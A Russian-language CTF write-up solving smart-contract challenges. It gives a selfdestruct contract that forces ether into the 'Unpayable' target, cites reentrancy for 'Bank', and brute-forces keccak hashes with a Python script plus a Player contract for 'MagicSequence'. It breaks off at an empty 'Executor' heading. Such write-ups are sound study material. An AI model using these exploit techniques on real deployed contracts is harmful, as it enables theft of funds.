# 0. Unpayable
Задеплоим такой контракт:

```
contract Pay{
    receive() external payable{

    }
    function destroy(address payable addr) public{
        selfdestruct(addr);
    }
}
```
Пополним его баланс переводом на его адрес, потом вызовем `destroy(<адрес контракта Unpayable>)`

# 1. Bank
Типичный reentrancy, решение Ethernaut lvl 10 почти идеально [подходит](https://medium.com/coinmonks/ethernaut-lvl-10-re-entrancy-walkthrough-how-to-abuse-execution-ordering-and-reproduce-the-dao-7ec88b912c14) (отличается только имя одной функции)

# 2. MagicSequence
Нужно сбрутить 4 числа, такие, что старшие 4 байта хеша будут равны `[0xbeced095, 0x42a7b7dd, 0x45e010b9, 0xa86c339e]`:
```
from eth_hash.auto import keccak
for s in ["beced095", "42a7b7dd", "45e010b9", "a86c339e"]:
    for i in range(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF):
        if keccak((i).to_bytes(32, byteorder="big")).hex()[:8]==s:
            print(i)
            break
```
Получаем числа `42, 55, 256, 9876543`. Деплоим следующий контракт и вызываем функцию `pwn(<адрес контракта задания>)`:
```
interface Magic{
      function start() public returns(bool);
}
contract Player{
    uint[] nums;
    uint pointer;
    constructor() public{
        nums.push(42);
        nums.push(55);
        nums.push(256);
        nums.push(9876543);
        pointer = 0;
    }
    function number() public returns(uint){
        return nums[pointer++];
    }
    function pwn(address addr) public{
        Magic(addr).start();
    }
}
```
# 3. Executor

